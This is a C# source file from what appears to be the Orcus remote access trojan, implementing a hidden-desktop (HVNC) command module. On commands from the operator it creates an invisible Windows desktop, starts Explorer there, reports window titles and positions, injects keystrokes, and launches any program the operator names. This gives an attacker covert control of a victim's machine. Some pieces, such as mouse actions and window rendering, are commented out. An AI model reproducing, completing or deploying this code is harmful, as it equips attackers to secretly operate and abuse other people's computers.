#if DEBUG
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Extensions;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.HVNC;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Settings;
using Orcus.Utilities.WindowsDesktop;
using WindowUpdate = Orcus.Shared.Commands.HVNC.WindowUpdate;

namespace Orcus.Commands.HVNC
{
    internal class HvncCommand : Command
    {
        private Desktop _currentDesktop;
        private List<RenderWindow> _renderWindows;
        private readonly object _desktopLock = new object();

        public override void Dispose()
        {
            base.Dispose();
            lock (_desktopLock)
                DisposeSession();
        }

        private void DisposeSession()
        {
            try
            {
                if (_renderWindows != null)
                {
                    foreach (var renderWindow in _renderWindows)
                        renderWindow.Dispose();
                    _renderWindows = null;
                }

                if (_currentDesktop != null)
                {
                    Desktop.SetCurrent(_currentDesktop);

                    _currentDesktop?.Dispose();
                    _currentDesktop = null;
                }
            }
            catch (Exception)
            {
#if DEBUG
                throw;
#endif
            }
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((HvncCommunication) parameter[0])
            {
                case HvncCommunication.CreateDesktop:
                    lock (_desktopLock)
                    {
                        var information =
                            new Serializer(typeof (CreateDesktopInformation)).Deserialize<CreateDesktopInformation>(
                                parameter, 1);

                        _currentDesktop = new Desktop();
                        _currentDesktop.Create(information.CustomName ?? Settings.GetBuilderProperty<MutexBuilderProperty>().Mutex);

                        if (information.StartExplorer)
                            _currentDesktop.CreateProcess(Path.Combine(
#if NET35
                            EnvironmentExtensions.WindowsFolder,
#else
                            Environment.GetFolderPath(Environment.SpecialFolder.Windows),
#endif
                            "explorer.exe"), "");
                        _renderWindows = new List<RenderWindow>();
                    }

                    var response = new byte[9];
                    response[0] = (byte)HvncCommunication.ResponseDesktopCreated;
                    Array.Copy(BitConverter.GetBytes(SystemInformation.VirtualScreen.Width), 0, response, 1, 4);
                    Array.Copy(BitConverter.GetBytes(SystemInformation.VirtualScreen.Height), 0, response, 5, 4);
                    ResponseBytes(response, connectionInfo);
                    break;
                case HvncCommunication.CloseDesktop:
                    lock (_desktopLock)
                    {
                        if (_currentDesktop?.IsOpen == true)
                        {
                            DisposeSession();
                        }
                    }
                    ResponseByte((byte) HvncCommunication.ResponseDesktopClosed, connectionInfo);
                    break;
                case HvncCommunication.GetUpdate:
                    lock (_currentDesktop)
                    {
                        if (_currentDesktop == null || !_currentDesktop.IsOpen)
                        {
                            ResponseByte((byte) HvncCommunication.ResponseUpdateFailed, connectionInfo);
                            return;
                        }

                        try
                        {
                            Desktop.SetCurrent(_currentDesktop);

                            var windows = _currentDesktop.GetWindows();
                            if (windows == null)
                            {
                                ResponseByte((byte)HvncCommunication.ResponseUpdateFailed, connectionInfo);
                                return;
                            }

                            var windowResult = new WindowUpdate { AllWindows = windows.Select(x => x.Handle.ToInt64()).ToList() };

                            const int maxWindowNameLength = 100;
                            var ptr = Marshal.AllocHGlobal(maxWindowNameLength);

                            try
                            {
                                foreach (var window in windows)
                                {
                                    RECT rect;
                                    NativeMethods.GetWindowRect(window.Handle, out rect);
                                    NativeMethods.GetWindowText(window.Handle, ptr, maxWindowNameLength);

                                    var windowInformation = new WindowInformation
                                    {
                                        Handle = (int)window.Handle,
                                        Height = rect.Height,
                                        Width = rect.Width,
                                        X = rect.X,
                                        Y = rect.Y,
                                        Title = Marshal.PtrToStringAnsi(ptr)
                                    };

                                    var existingRenderWindow =
                                        _renderWindows.FirstOrDefault(x => x.WindowInformation.Handle == (int)window.Handle);

                                    if (existingRenderWindow == null)
                                    {
                                        windowResult.NewWindows.Add(windowInformation);
                                        _renderWindows.Add(new RenderWindow(windowInformation, window.Handle));
                                    }
                                    else
                                    {
                                        if (existingRenderWindow.WindowInformation.Equals(windowInformation))
                                            continue;

                                        windowResult.UpdatedWindows.Add(windowInformation);
                                        existingRenderWindow.ApplyWindowInformation(windowInformation);
                                    }
                                }
                            }
                            finally
                            {
                                Marshal.FreeHGlobal(ptr);
                            }

                            var windowToRenderHandle = BitConverter.ToInt32(parameter, 1);
                            if (windowToRenderHandle != 0)
                            {
                                var renderWindow =
                                    _renderWindows.FirstOrDefault(x => x.WindowInformation.Handle == windowToRenderHandle);

                                if (renderWindow != null)
                                {
                                    try
                                    {
                                        Debug.Print("Render window: " + windowToRenderHandle);
                                        //windowResult.RenderedWindow = renderWindow.Render();
                                        if (windowResult.RenderedWindow == null)
                                        {
                                            Debug.Print("Render failed");
                                        }
                                        windowResult.RenderedWindowHandle = renderWindow.WindowInformation.Handle;
                                    }
                                    catch (Exception)
                                    {
                                        //shit happens
                                    }
                                }
                            }

                            ResponseBytes((byte) HvncCommunication.ResponseUpdate,
                                new Serializer(typeof(WindowUpdate)).Serialize(windowResult), connectionInfo);
                        }
                        catch (Exception)
                        {
#if DEBUG
                            throw;
#else
                            ResponseByte((byte) HvncCommunication.ResponseUpdateFailed, connectionInfo);
#endif
                        }
                    }
                    break;
                case HvncCommunication.DoAction:
                    lock (_desktopLock)
                    {
                        Debug.Print("Begin DoAction");
                        DoAction((HvncAction)parameter[1], parameter.Skip(2).ToArray());
                        Debug.Print("End DoAction");
                    }
                    break;
                case HvncCommunication.ExecuteProcess:
                    lock (_desktopLock)
                    {
                        Debug.Print("Begin ExecuteProcess");
                        _currentDesktop.CreateProcess(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1), "");
                        Debug.Print("End ExecuteProcess");
                    }

                    connectionInfo.CommandResponse(this,
                        new[] {(byte) HvncCommunication.ResponseProcessExecuted});
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private void DoAction(HvncAction action, byte[] parameter)
        {
            if (_currentDesktop?.IsOpen != true)
                return;

            Desktop.SetCurrent(_currentDesktop);

            switch (action)
            {
                case HvncAction.LeftDown:
                case HvncAction.LeftUp:
                case HvncAction.RightDown:
                case HvncAction.RightUp:
                case HvncAction.MouseMove:
                    var x = BitConverter.ToInt32(parameter, 0);
                    var y = BitConverter.ToInt32(parameter, 4);

                    MouseAction(action, new Point(x, y));
                    break;
                case HvncAction.ScrollDown:
                    //RemoteActions.DoMouseScroll(true);
                    break;
                case HvncAction.ScrollUp:
                    //RemoteActions.DoMouseScroll(false);
                    break;
                case HvncAction.KeyReleased:
                case HvncAction.KeyPressed:
                    var key = parameter[0];
                    _currentDesktop.DesktopActions.KeyDown((Keys)key, action == HvncAction.KeyPressed);
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(action), action, null);
            }
        }

        private void MouseAction(HvncAction action, Point p)
        {
            //_currentDesktop.DesktopActions.DoMouseClick(p, action);
        }

        protected override uint GetId()
        {
            return 23;
        }
    }
}
#endif